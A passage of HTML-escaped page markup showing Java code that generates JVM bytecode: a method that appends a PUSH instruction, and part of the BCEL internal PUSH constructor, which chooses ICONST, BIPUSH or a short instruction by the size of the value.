style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;MethodGenerator&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; methodGen&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;)&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;ConstantPoolGen&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; cpg &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; classGen&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;getConstantPool&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;InstructionList&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; il &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; methodGen&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;getInstructionList&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;il&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;append&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;new&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; PUSH&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;cpg&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;,&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; _value&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;));&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;// org/apache/bcel/internal/generic/PUSH.java&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;public&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; PUSH&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;final&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;ConstantPoolGen&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; cp&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;,&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;final&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;int&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; value&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;)&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;if&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;((&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;value &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;-&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #c53929; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;1&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;)&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;value &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #c53929; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;5&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;))&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;instruction &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;InstructionConst&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;getInstruction&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Const&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;ICONST_0 &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;+&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; value&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;else&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;if&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Instruction&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;isValidByte&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;value&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;))&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;instruction &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;new&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; BIPUSH&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;((&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;byte&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;)&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; value&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;else&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;if&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Instruction&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;isValidShort&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: 